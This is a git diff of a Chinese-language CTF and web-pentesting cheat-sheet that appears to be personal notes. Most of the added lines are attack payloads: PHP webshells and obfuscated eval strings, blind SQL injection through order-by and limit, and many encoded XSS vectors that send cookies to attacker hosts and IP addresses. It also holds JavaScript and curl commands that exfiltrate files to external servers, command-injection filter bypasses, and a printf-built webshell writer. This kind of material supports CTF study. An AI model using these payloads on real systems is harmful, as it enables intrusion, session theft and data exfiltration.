@@ -44,11 +44,53 @@ curl 795204849|python  # 这样不行？直接404
 curl 47.101.220.241|python
 
 <?php eval($_GET[1]);?>
+
+php://filter/read=convert.base64-encode/resource=index.php
+php://filter/write=convert.base64-decode/resource=index.php
 ```
 
 
 
 ## 每天学点新东西
+
+burp
+
+```
+生成GET数据包：复制url -> 打开burp -> repeater -> 右键paste url as request
+生成POST数据包：生成一个GET数据包 -> 右键change request method
+生成上传数据包：生成一个POST数据包 -> 右键change body encoding  -> 增加filename字段 -> 右键paste from file添加待上传的文件
+发送真实数据包：chrome抓包 -> 复制数据包 -> 粘贴到repeater -> 增加target -> 发送
+从数据包生成URL：任意数据包页面 -> 右键copy url
+从数据包生成curl命令：任意数据包页面 -> 右键copy as curl command
+从数据包生成html表单（可测CSRF漏洞）：任意数据包页面 -> 右键engagement tools -> generate csrf poc
+```
+
+
+
+```php
+<?php
+$text = $_GET['text'];
+if(preg_match('[<>?]', $text)) {
+    die('error!');
+}
+file_put_contents('config.php', $text);
+
+// text 这可以传一个数组，过了正则匹配，在 file_put_contents 处又可以自动拼接
+text[0]=<&text[1]=?php%20phpinfo();
+
+
+pathinfo($log_name, PATHINFO_EXTENSION) 用 /. 绕？
+
+
+<?php
+$content = '<?php exit; ?>';
+$content .= $_POST['txt'];
+file_put_contents($_POST['filename'], $content);
+```
+
+
+
+看清楚编码
 
 ```
 \x09  => 正常十六进制
@@ -61,9 +103,9 @@ curl 47.101.220.241|python
 <?php
 function runCommand($cmd) {
     $descriptors = [
-        0 => array("pipe", "rw"),
-        1 => array("pipe", "w"),
-        2 => array("pipe", "w"),
+        array("pipe", "rw"),
+        array("pipe", "w"),
+        array("pipe", "w"),
     ];
     $pipes = [];
     $process = \proc_open($cmd, $descriptors, $pipes, __DIR__);
@@ -112,7 +154,7 @@ var_dump(runCommand('/readflag'));
 find /var/www/html -type f -path "*.php" | xargs sed -i "s/<?php/<?php require_once('/tmp/waf.php');n/g"
 ```
 
-
+ad 常用命令
 
 ```shell
 ssh <-p 端口> 用户名@IP　　
@@ -151,7 +193,7 @@ cat /var/log/apache2/access.log | cut -f4 -d   | sort | uniq -c | sort -k  -r | 
 
 
 
-扫同网段端口
+扫同网段端口，可以直接看 arp 缓存
 
 ```shell
 arp -an
@@ -230,6 +272,8 @@ netstat -tln
     $__.=("{"^"/"); // _POST 
     ${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);
 ?>
+// 写成一行
+<?php $__=("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/");?>
 ```
 
 
@@ -286,11 +330,11 @@ Layer子域名挖掘机、Sublist3r、dnsmaper、
 
 
 
-做题的时候不要忘了乌云，搜索会有惊喜
+做题的时候不要忘了乌云和 `exploit-db`，搜索会有惊喜
 
 
 
-很多人会忘记 127.0.0.0/8 ，认为本地地址就是 127.0.0.1 ，实际上本地回环包括了整个127段。你可以访问`http://127.233.233.233/`，会发现和请求127.0.0.1是一个结果
+很多人会忘记 127.0.0.0/8 ，认为本地地址就是 127.0.0.1 ，实际上本地回环包括了整个127段。你可以访问`http://127.233.233.233/`，会发现和请求 127.0.0. 1是一个结果。
 
 
 
@@ -364,16 +408,6 @@ foo.php?param=include$_GET[1];
 
 
 
-> 之前学习`phar`协议反序列化时fuzz过一遍PHP函数，发现了PHP的一个特点：**只要是传filename的地方，基本都可以传协议流**。而`file_put_contents`的第一个参数显然就是传`filename`的地方，那么试试可不可以利用php伪协议？
-
-
-
-get_defined_vars ( void ) : array
-
-此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。
-
-
-
 'SERVER_NAME'
 
 当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。
@@ -418,7 +452,7 @@ GitHub ：webdirscan weakfilescan bbscan
 
 ### CMS 至少自己会搭建
 
-CMS部分搭建，框架部分随便写点什么玩意
+CMS部分搭建，框架部分随便写点什么，比如 hello world
 
 ```
 Java
@@ -523,37 +557,67 @@ Golang
 
 ![img](https://qqadapt.qpic.cn/txdocpic/0/8f76487a3fe36749dfd454f8ac4d8c78/0)
 
+**Limit 注入**
+
++ 报错注入
+
+```mysql
+mysql> select * from users where id>1 order by id limit 1,1 
+procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 
+ERROR 1105 (HY000): XPATH syntax error: ':5.5.53'
+```
+
++ 时间盲注
+
+```mysql
+select * from users where id>1 order by id limit 1,1 
+procedure analyse((select extractvalue
+(rand(),concat(0x3a,(IF(MID(version(),1,1) 
+like 5,BENCHMARK(5000000,SHA1(1)),1))))),1);
+```
+
+**Order by 注入**
+
+```
+/?order=IF(1=1,name,price) 通过name字段排序
+/?order=IF(1=2,name,price) 通过price字段排序
+/?order=(CASE+WHEN+(1=1)+THEN+name+ELSE+price+END) 通过name字段排序
+/?order=(CASE+WHEN+(1=2)+THEN+name+ELSE+price+END) 通过price字段排序
+/?order=IFNULL(NULL,price) 通过price字段排序
+/?order=IFNULL(NULL,name) 通过name字段排序
+/?order=rand(1=1) 
+/?order=rand(1=2)
+/?order=IF(1=1,1,(select+1+from+information_schema.tables)) 正常 /?order=IF(1=2,1,(select+1+from+information_schema.tables)) 错误 
+利用regexp 
+/?order=(select+1+regexp+if(1=1,1,0x00)) 正常 
+/?order=(select+1+regexp+if(1=2,1,0x00)) 错误  
+利用updatexml 
+/?order=updatexml(1,if(1=1,1,user()),1) 正确
+/?order=updatexml(1,if(1=2,1,user()),1) 错误  
+利用extractvalue 
+/?order=extractvalue(1,if(1=1,1,user())) 正确 
+/?order=extractvalue(1,if(1=2,1,user())) 错误 
+sleep
+/?order=if(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) 正常响应时间
+/?order=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) sleep 2秒
+数据猜解
+通过下可以得知user()第一位为r,ascii码的16进制为0x72：
+/?order=(select+1+regexp+if(substring(user(),1,1)=0x72,1,0x00)) 正确
+/?order=(select+1+regexp+if(substring(user(),1,1)=0x71,1,0x00)) 错误
+猜解当前数据库的表名：
+/?order=(select+1+regexp+if(substring((select+concat(table_name)from+information_schema.tables+where+
+table_schema%3ddatabase()+limit+0,1),1,1)=0x67,1,0x00)) 正确
+/?order=(select+1+regexp+if(substring((select+concat(table_name)from+information_schema.tables+where+
+table_schema%3ddatabase()+limit+0,1),1,1)=0x66,1,0x00)) 错误
+猜解指定表名中的列名：
+/?order=(select+1+regexp+if(substring((select+concat(column_name)from+information_schema.columns
++where+table_schema%3ddatabase()+and+table_name%3d0x676f6f6473+limit+0,1),1,1)=0x69,1,0x00)) 正常
+
+/?order=(select+1+regexp+if(substring((select+concat(column_name)from+information_schema.columns
++where+table_schema%3ddatabase()+and+table_name%3d0x676f6f6473+limit+0,1),1,1)=0x68,1,0x00)) 错误
+```
 
 
-+ 基于从服务器接收到的响应
-  + 基于错误的SQL注入
-  + 联合查询的类型
-  + 堆查询注入
-  + SQL盲注
-    + 基于布尔SQL盲注
-    + 基于时间的SQL盲注
-    + 基于报错的SQL盲注
-
-+ 基于如何处理输入的SQL查询（数据类型）
-  + 基于字符串
-  + 数字或整数为基础的
-
-+ 基于程度和顺序的注入(哪里发生了影响)
-
-  + 一次注入
-
-    输入的注入语句对WEB直接产生了影响，出现了结果
-
-  + 二次注入
-
-    类似存储型XSS，是指输入提交的语句，无法直接对WEB应用程序产生影响，
-
-    通过其它的辅助间接的对WEB产生危害，这样的就被称为是二次注入
-
-+ 基于注入点的位置上的
-  + 通过用户输入的表单域的注入
-  + 通过cookie注入
-  + 通过服务器变量注入（基于头部信息的注入）
 
 #### MySQL
 
@@ -661,7 +725,9 @@ and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from inform
 
 ##### insert / update / delete 注入
 
-结合函数报错信息，将函数插入到语句中
++ 结合函数报错信息，将函数插入到语句中
++ 将查询结果插入表中，再通过其他途径查看
++ 
 
 
 
@@ -1029,9 +1095,93 @@ Access 是以单文件，mdb 格式，以表的形式存在，所以数据库也
 + host 相同
 + 端口相同
 
+#### JS 常用操作
+
+```javascript
+// 拿 HTML 源码
+btoa(document.body.innerHTML)
+
+// 构造 Ajax 发送请求，返回对应请求结果
+var x=new XMLHttpRequest();
+x.onreadystatechange=function() {
+    if (x.readyState==4 && x.status==200) {
+        document.location='http://47.101.220.241:9999/?code='+btoa(x.responseText);
+    }
+}
+x.open("POST","request.php",true);
+x.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+x.send("url=file:///var/www/html/config.php");
+
+document.location='http://vps_ip?cookie'+document.cookie
+
+<script>fetch('exec.php',{method:'POST',headers:{'content-type':'application/x-www-form-urlencoded'},body:'command='+encodeURIComponent('curl xss.zsxsoft.com:23457 -F"a=@/flag.txt"')+'&exec=1'}).then(p=>p.text()).then(p=>fetch('main.php',{method:'POST',headers:{'content-type':'application/x-www-form-urlencoded'},body:'comment='+p}))</script>
+
+<iframe srcdoc="<script>fetch('exec.php',{method:'POST',headers:{'content-type':'application/x-www-form-urlencoded'},body:'command='+encodeURIComponent('')}).then(p=>p.text()).then(p=>fetch('main.php',{method:'POST',headers:{'content-type':'application/x-www-form-urlencoded'},body:'comment='+p}))</script> "></iframe>
+```
+
+
+
 #### 常见标签
 
-**`<img>`**
+反射XSS语句
+
+```
+<body/onfocus=alert(/xss/)>
+
+<video src=1 onerror=alert(/xss/)>
+<audio src=x onerror=alert(/xss/)>
+
+<button onfocus=alert(/xss/) autofocus>
+
+<details open ontoggle=top.alert(1)>
+<details open ontoggle=top['prompt'](1)>
+<details open ontoggle=eval(‘alert(1)’) >
+<details open ontoggle=eval(atob('YWxlcnQoMSk=')) >
+<details open ontoggle=eval('\141\154\145\162\164\50\61\51') >
+<details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41)) >
+<details open ontoggle=eval("appendChild(createElement('script')).src='http://vps_ip'") >
+
+<img src=x onerror=window['eva'+'l'](alert(1)) >
+<img src=x onerror=_=alert,_(/xss/) >
+<img src=x onerror=_='e'+'val',_(alert(1)) >
+
+<iframe onload=location='javascri'.concat('pt:aler','t(1)')>
+<iframe srcdoc="<img src=x:x onerror=alert(1)>" />
+<iframe onload=location=['java','script:','alert(1)'].join("")>
+
+<body/onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)) >
+```
+
+XSS窃取cookie
+
+```
+<details open ontoggle="javascript:document.location='http://vps_ip'">
+<video src=1 onerror="javascript:document.location='http://vps_ip'">
+<iframe onload=location='javascri'.concat("pt:document",".location=","'http://vps_ip'")>
+<iframe onload=s=createElement('script');body.appendChild(s);s.src='http://120.77.176.1'.concat('68:111','22'); >
+<iframe onload=s=createElement('script');body.appendChild(s);s.src='http://120.77.176.1'.\u0063oncat('68:111','22'); >
+<iframe onload=location=["java","script:","document.location=","'http://vps_ip'"].join("")>
+<body/onload=document.write(String.fromCharCode(60,115,67,114,73,112,116,32,115,114,67,61,39,104,116,116,112,58,47,47,49,50,48,46,55,55,46,49,55,54,46,49,54,56,58,49,49,49,50,50,39,62,60,47,115,67,82,105,112,84,62)) >
+<svg/onload=setTimeout("\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0032\u0030\u002e\u0037\u0037\u002e\u0031\u0037\u0036\u002e\u0031\u0036\u0038\u003a\u0031\u0031\u0031\u0032\u0032\u0027")>
+<details open ontoggle="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:&#x64;&#x6F;&#x63;&#x75;&#x6D;&#x65;&#x6E;&#x74;&#x2E;&#x6C;&#x6F;&#x63;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x3D;'&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x31;&#x32;&#x30;&#x2E;&#x37;&#x37;&#x2E;&#x31;&#x37;&#x36;&#x2E;&#x31;&#x36;&#x38;&#x3A;&#x31;&#x31;&#x31;&#x32;&#x32;'">
+<details open ontoggle=eval('\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0032\u0030\u002e\u0037\u0037\u002e\u0031\u0037\u0036\u002e\u0031\u0036\u0038\u003a\u0031\u0031\u0031\u0032\u0032\u0027') >
+<svg/onload=\u0073etTimeout("\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0032\u0030\u002e\u0037\u0037\u002e\u0031\u0037\u0036\u002e\u0031\u0036\u0038\u003a\u0031\u0031\u0031\u0032\u0032\u0027")>
+<details open ontoggle=eval(atob('amF2YXNjcmlwdDpkb2N1bWVudC5sb2NhdGlvbj0naHR0cDovLzEyMC43Ny4xNzYuMTY4OjExMTIyJw==')) >
+<video src=1 onerror=eval(atob('amF2YXNjcmlwdDpkb2N1bWVudC5sb2NhdGlvbj0naHR0cDovLzEyMC43Ny4xNzYuMTY4OjExMTIyJw=='))>
+<details open ontoggle=eval('\152\141\166\141\163\143\162\151\160\164\72\144\157\143\165\155\145\156\164\56\154\157\143\141\164\151\157\156\75\47\150\164\164\160\72\57\57\61\62\60\56\67\67\56\61\67\66\56\61\66\70\72\61\61\61\62\62\47') >
+<details open ontoggle=\u0065val(atob('amF2YXNjcmlwdDpkb2N1bWVudC5sb2NhdGlvbj0naHR0cDovLzEyMC43Ny4xNzYuMTY4OjExMTIyJw==')) >
+<img src=x onerror=window['eva'+'l']('\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0032\u0030\u002e\u0037\u0037\u002e\u0031\u0037\u0036\u002e\u0031\u0036\u0038\u003a\u0031\u0031\u0031\u0032\u0032\u0027') >
+```
+
+
+
+**xss 简易探针**
+
+```
+`';!--"<XSS>=&{()}
+```
+
+**`img`**
 
 ```html
 <img src=javascript:alert("xss")>
@@ -1046,13 +1196,13 @@ Access 是以单文件，mdb 格式，以表的形式存在，所以数据库也
 <img src=1 onmouseover=alert('xss')>
 ```
 
-**`<a>`**
+**`a`**
 
 ```html
-<a href="https://www.baidu.com">baidu</a>
+<a href="http://795204849:9999">baidu</a>
 
-<a href="javascript:alert('xss')">aa</a>
-<a href=javascript:eval(alert('xss'))>aa</a>
+<a href="javascript:alert(1)">aa</a>
+<a href=javascript:eval(alert(1))>aa</a>
 <a href="javascript:aaa" onmouseover="alert(/xss/)">aa</a>
 
 <script>alert('xss')</script>
@@ -1093,6 +1243,7 @@ Access 是以单文件，mdb 格式，以表的形式存在，所以数据库也
 <form method=post action=aa.asp? onmouseover=prompt('xss')>
 <form method=post action=aa.asp? onmouseover=alert('xss')>
 <form action=1 onmouseover=alert('xss')>
+<form><button formaction=javascript:alert(1)>
     
 <!--原code-->
 <form method=post action="data:text/html;base64,<script>alert('xss')</script>">
@@ -1100,15 +1251,15 @@ Access 是以单文件，mdb 格式，以表的形式存在，所以数据库也
 <form method=post action="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
 ```
 
-**`<iframe>`**
+**`iframe`**
 
 ```html
-<iframe src=javascript:alert('xss');height=5width=1000 /><iframe>
+<iframe src=javascript:alert(1) width=1366 height=768></iframe>
+<iframe src=https://baidu.com width=1366 height=768></iframe>
+<iframe src=javascript:alert(1)><iframe>
+<iframe srcdoc=<svg/o&#x6E;load&equals;alert&lpar;1)&gt;></iframe>
     
 <iframe src="data:text/html,&lt;script&gt;alert('xss')&lt;/script&gt;"></iframe>
-<!--原code-->
-<iframe src="data:text/html;base64,<script>alert('xss')</script>">
-<!--base64编码-->
 <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
     
 <iframe src="aaa" onmouseover=alert('xss') /><iframe>
@@ -1116,14 +1267,18 @@ Access 是以单文件，mdb 格式，以表的形式存在，所以数据库也
 <iframe src="javascript&colon;prompt&lpar;`xss`&rpar;"></iframe>
 ```
 
-**`<svg>`**
+**`svg`**
 
 ```html
-<svg onload=alert(1);>
-<svg/onload=prompt(1)
+<svg/onload=alert(1)>
+<svg/onload=alert(2)
+<svg/onload="javascript:alert(3)">
+<svg/onload=alert(4) <
+<svg/onload=alert(5)//
+<svg/onload=setTimeout('\141\154\145\162\164\50\61\51')>
 ```
 
-**`<details>`**
+**`details`**
 
 ```html
 <details ontoggle="alert('xss');">
@@ -1132,7 +1287,7 @@ Access 是以单文件，mdb 格式，以表的形式存在，所以数据库也
 <details open ontoggle="alert('xss');">
 ```
 
-**`<select>`**
+**`select`**
 
 ```html
 <select onfocus=alert(1)></select>
@@ -1142,7 +1297,15 @@ Access 是以单文件，mdb 格式，以表的形式存在，所以数据库也
 <select onfocus=alert(1) autofocus>
 ```
 
+**`meta`**
 
+```html
+<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
+```
+
+
+
+### Bypass
 
 #### 编码绕过
 
@@ -1173,56 +1336,7 @@ JS提供了四种字符编码的策略，
 
 如`alert`的编码为`String.fromCharCode(97,108,101,114,116)`
 
-### Bypass
-
-### 杂项
-
-#### CSP 绕过总结
-
-##### CSP 是什么？
-
-> Content Security Policy 用来防御 XSS 攻击的技术。它是一种由开发者定义的安全性政策申明，通过 CSP 指定可信的内容来源，让 WEB 处于一个安全的运行环境中。
-
-例如：
-
-```
-Content-Security-Policy: default-src 'self'; script-src 'self';
-```
-
-**指令说明**
-
-| 指令        | 说明                                                |
-| ----------- | --------------------------------------------------- |
-| default-src | 定义资源默认加载策略                                |
-| connect-src | 定义 Ajax、WebSocket 等加载策略                     |
-| font-src    | 定义 Font 加载策略                                  |
-| frame-src   | 定义 Frame 加载策略                                 |
-| img-src     | 定义图片加载策略                                    |
-| media-src   | 定义 <audio>、<video> 等引用资源加载策略            |
-| object-src  | 定义 <applet>、<embed>、<object> 等引用资源加载策略 |
-| script-src  | 定义 JS 加载策略                                    |
-| style-src   | 定义 CSS 加载策略                                   |
-| sandbox     | 值为 allow-forms，对资源启用 sandbox                |
-| report-uri  | 值为 /report-uri，提交日志                          |
-
-**关键词**
-
-| 属性值                              | 示例                                        | 说明                                                         |
-| ----------------------------------- | ------------------------------------------- | ------------------------------------------------------------ |
-| *                                   | img-src *                                   | 允许从任意url加载，除了data:blob:filesystem:schemes          |
-| 'none'                              | object-src 'none'                           | 禁止从任何url加载资源                                        |
-| 'self'                              | img-src 'self'                              | 只可以加载同源资源                                           |
-| data:                               | img-src 'self' data:                        | 可以通过data协议加载资源                                     |
-| domain.example.com                  | ing-src domain.example.com                  | 只可以从特定的域加载资源                                     |
-| *.example.com                       | img-src *.example.com                       | 可以从任意example.com的子域处加载资源                        |
-| [https://cdn.com](https://cdn.com/) | img-src [https://cdn.com](https://cdn.com/) | 只能从给定的域用https加载资源                                |
-| https:                              | img-src https:                              | 只能从任意域用https加载资源                                  |
-| 'unsafe-inline'                     | script-src 'unsafe-inline'                  | 允许内部资源执行代码例如style attribute,onclick或者是sicript标签 |
-| 'unsafe-eval'                       | script-src 'unsafe-eval'                    | 允许一些不安全的代码执行方式，例如js的eval()                 |
-
-
-
-##### 过滤空格
+#### 过滤空格
 
 用`/`代替空格
 
@@ -1240,7 +1354,7 @@ Content-Security-Policy: default-src 'self'; script-src 'self';
 
 ##### 双写关键字
 
-有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过
+有些waf可能会只替换一次且是替换为空
 
 ```html
 <imimgg srsrcc=x onerror=alert("xss");>
@@ -1314,7 +1428,7 @@ base64绕过
 <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
 ```
 
-##### 过滤双引号，单引号
+#### 过滤双引号，单引号
 
 1.如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号
 
@@ -1405,22 +1519,62 @@ alert`1`
 
 
 
-
-
 当 = ( ) ; : 被过滤时
 
 ```html
 <svg><script>alert&#40/1/&#41</script> // 通杀所有浏览器
 ```
 
+### 杂项
+
+#### CSP 绕过总结
+
+##### CSP 是什么？
+
+> Content Security Policy 用来防御 XSS 攻击的技术。它是一种由开发者定义的安全性政策申明，通过 CSP 指定可信的内容来源，让 WEB 处于一个安全的运行环境中。
+
+例如：
+
+```
+Content-Security-Policy: default-src 'self'; script-src 'self';
+```
+
+**指令说明**
+
+| 指令        | 说明                                                |
+| ----------- | --------------------------------------------------- |
+| default-src | 定义资源默认加载策略                                |
+| connect-src | 定义 Ajax、WebSocket 等加载策略                     |
+| font-src    | 定义 Font 加载策略                                  |
+| frame-src   | 定义 Frame 加载策略                                 |
+| img-src     | 定义图片加载策略                                    |
+| media-src   | 定义 <audio>、<video> 等引用资源加载策略            |
+| object-src  | 定义 <applet>、<embed>、<object> 等引用资源加载策略 |
+| script-src  | 定义 JS 加载策略                                    |
+| style-src   | 定义 CSS 加载策略                                   |
+| sandbox     | 值为 allow-forms，对资源启用 sandbox                |
+| report-uri  | 值为 /report-uri，提交日志                          |
+
+**关键词**
+
+| 属性值                              | 示例                                        | 说明                                                         |
+| ----------------------------------- | ------------------------------------------- | ------------------------------------------------------------ |
+| *                                   | img-src *                                   | 允许从任意url加载，除了data:blob:filesystem:schemes          |
+| 'none'                              | object-src 'none'                           | 禁止从任何url加载资源                                        |
+| 'self'                              | img-src 'self'                              | 只可以加载同源资源                                           |
+| data:                               | img-src 'self' data:                        | 可以通过data协议加载资源                                     |
+| domain.example.com                  | ing-src domain.example.com                  | 只可以从特定的域加载资源                                     |
+| *.example.com                       | img-src *.example.com                       | 可以从任意example.com的子域处加载资源                        |
+| [https://cdn.com](https://cdn.com/) | img-src [https://cdn.com](https://cdn.com/) | 只能从给定的域用https加载资源                                |
+| https:                              | img-src https:                              | 只能从任意域用https加载资源                                  |
+| 'unsafe-inline'                     | script-src 'unsafe-inline'                  | 允许内部资源执行代码例如style attribute,onclick或者是sicript标签 |
+| 'unsafe-eval'                       | script-src 'unsafe-eval'                    | 允许一些不安全的代码执行方式，例如js的eval()                 |
 
 
-### prompt(1) to win
 
 
 
 
-### alert(1) to win
 
 ## 代码审计
 
@@ -1469,19 +1623,356 @@ alert`1`
 
 
 
-## 文件操作
+## 命令执行
+
+#### 直接执行代码
+
+PHP 中有不少可以直接执行代码的函数。
+
+```php
+eval();
+assert();
+system();
+exec();
+shell_exec();
+passthru();
+escapeshellcmd();
+pcntl_exec();
+```
+
+#### preg_replace( ) 代码执行
+
+preg_replace() 的第一个参数如果存在 `/e` 模式修饰符，则允许代码执行。
+
+```php
+<?php
+    $var = "<tag>phpinfo()</tag>";
+	preg_replace("/<tag>(.*?)<\/tag>/e", "addslashes(\\1)", $var);
+?>
+```
+
+若无 `/e` 修饰符，则可以尝试 %00 截断。
+
+### 重定向
+
+- cmd > file
+    把cmd命令的输出重定向到文件file中。如果file已经存在，则清空原有文件，使用bash的noclobber选项可以防止复盖原有文件。
+
+- cmd >> file
+    把cmd命令的输出重定向到文件file中，如果file已经存在，则把信息加在原有文件后面。
+
+- cmd < file
+    使cmd命令从file读入
+
+- cmd << text
+    从命令行读取输入，直到一个与text相同的行结束。除非使用引号把输入括起来，此模式将对输入内容进行shell变量替换。如果使用`<<-` ，则会忽略接下来输入行首的tab，结束行也可以是一堆tab再加上一个与text相同的内容，可以参考後面的例子。
+
+- cmd <<< word
+    把word（而不是文件word）和后面的换行作为输入提供给cmd。
+
+- cmd <> file
+    以读写模式把文件file重定向到输入，文件file不会被破坏。仅当应用程序利用了这一特性时，它才是有意义的。
+
+- cmd >| file
+    功能同>，但即便在设置了noclobber时也会复盖file文件，注意用的是|而非一些书中说的!，目前仅在csh中仍沿用`>!`实现这一功能。
+
+- : > filename
+
+    把文件`filename`截断为0长度。如果文件不存在, 那么就创建一个0长度的文件(与`touch`的效果相同).
+
+- cmd >&n
+
+    把输出送到文件描述符n
+
+- cmd m>&n
+
+    把输出到文件符m的信息重定向到文件描述符n
+
+- cmd >&-
+
+    关闭标准输出
+
+- cmd <&n
+
+    输入来自文件描述符n
+
+- cmd m<&n
+
+    m来自文件描述各个n
+
+- cmd <&-
+
+    关闭标准输入
+
+- cmd <&n-
+
+    移动输入文件描述符n而非复制它。
+
+- cmd >&n-
+
+    移动输出文件描述符n而非复制它。
+    注意： `>&`实际上复制了文件描述符，这使得`cmd > file 2>&1`与`cmd 2>&1 >file`的效果不一样。
+
+### 读文件
+
+```
+cat flag /{cat,flag}
+more flag
+less flag
+bzmore flag
+bzless flag
+head flag
+tail flag
+tailf flag 
+tac flag
+nl flag
+od -a flag
+
+fire flag
+wc flag
+uniq flag
+diff flag flag1.txt
+sed -n '1,2p' flag
+find -P flag
+strings flag
+curl file:///root/flag
+sort flag
+bash -v flag 
+rev flag
+paste ./flag.txt /etc/passwd
+```
+
+#### Bypass
+
+**多条命令**
+
+```
+%0a、%0d    换行符与回车符
+|           第一条命令结果作为第二条命令的输入
+||          第一条执行失败，执行第二条命令
+;           连续指令功能。
+&           连接的两条命令都会执行
+&&          当第一条执行成功后执行后续命令
+
+echo 666`date` => 666Tue 14 May 2019 07:15:23 AM EDT
+
+# Windows
+Copy %0a
+%1a - 一个神奇的角色，作为.bat文件中的命令分隔符
+```
+
+**绕过 escapeshellcmd**
+
++ win 下执行 bat
+
+```
+<?php
+$command = 'dir '.$_POST['dir'];
+$escaped_command = escapeshellcmd($command);
+var_dump($escaped_command);
+file_put_contents('out.bat',$escaped_command);
+system('out.bat');
+```
+
+执行.bat文件的时候，利用%1a，可以绕过过滤执行命令。
+
+```
+dir=../ %1a whoami
+```
+
+**空格过滤**
+
++ ${IFS}
+
+```shell
+cat${IFS}flag
+cat${IFS}$9flag
+cat$IFS$9flag
+cat%09flag  # \0x09 是 TAB
+```
+
++ 重定向符<>
+
+```shell
+cat<>flag
+cat<flag
+```
+
+**黑名单绕过**
+
++ 拼接
+
+```shell
+a=c;b=at;c=flag;$a$b $c
+```
+
++ 利用已存在的资源
+
+从已有的文件或者环境变量中获得相应的字符。
+
++ 编码
+
+```shell
+`echo "Y2F0IGZsYWc="|base64 -d`
+echo "Y2F0IGZsYWc="|base64 -d|bash
+
+$(printf "\x63\x61\x74\x20\x66\x6c\x61\x67")
+
+#可以通过这样来写webshell,内容为<?php @eval($_POST['c']);?>
+$ {printf,"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"} >> 1.php
+```
+
++ 单引号、双引号
+
+```shell
+c""at fl''ag
+c'a't f'l'ag
+```
+
++ 反斜线 \
+
+```shell
+c\at fl\ag
+```
+
++ 通配符
+
+```shell
+/?in/?s => ls
+
+* 0到无穷个任意字符
+? 一个任意字符
+[ ] 一个在括号内的字符，e.g. [abcd]
+[ - ] 在编码顺序内的所有字符
+[^ ] 一个不在括号内的字符
+[! ] 同 ^
+cat fl[0-z]g
+
+echo d{a,e,i,u,o}g => dag deg dig dug dog
+echo {fl,fla}{ag,g} => flag flg flaag flag
+echo fl{0..z}g => fl1g,fl2g,...,flyg,flzg
+
+花括号拓展{OS_COMMAND,ARGUMENT}
+在Linux bash中还可以使用{cat,/etc/passwd}来绕过
+这里没实验成功
+```
+
++ 未定义变量
+
+```shell
+cat$x /etc/passwd
+```
+
++ 可变函数
+
+```
+(sy.(st).em)(whoami)
+$_GET[a]($_GET[b].$_GET[c])
+
+获取内置函数 system 的索引后，直接执行
+get_defined_functions()[internal] | grep ststem
+get_defined_functions()[internal][381](whoami)
+```
+
++ `$@`
+
+```
+$ c$@at fl$@ag
+flag{xxx}
+
+$ echo i$@d
+id
+
+$ i$@d
+uid=1000(wywwzjj) gid=1000(wywwzjj) groups=1000(wywwzjj)
+
+$ echo i$@d|$0
+uid=1000(wywwzjj) gid=1000(wywwzjj) groups=1000(wywwzjj)
+
+$ echo {nc,47.101.220.241,2333}|$0
+直接连 nc 了。。。$0 好牛逼？
+$0 就相当于 bash 另外 $n 表示命令行第 n 个参数
+
+$ $0<<<i$@d
+uid=1000(wywwzjj) gid=1000(wywwzjj) groups=1000(wywwzjj)
+```
+
++ 利用已经存在的资源
+
+```
+$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+$ echo $PATH| cut -c 1
+/
+
+$ echo $PATH| cut -c 1-4
+/usr
+```
+
+- ${PS2} 对应字符 ‘>’
+- ${PS4} 对应字符 ‘+’
+- ${IFS} 对应 内部字段分隔符
+- ${9} 对应 空字符串
+
+**无回显**
+
++ 弹 shell
+
++ DNS 外带数据
+
+```
+curl "http://testhash.test.dnslog.link/?`whoami`"
+```
+
++ HTTP 外带
+
+```shell
+# linux
+curl http://evil-server/`whoami`
+wget http://evil-server/$(whoami)
+curl xxxx.ceye.io/`whoami`
+curl http://xxxx.ceye.io/$(id|base64)
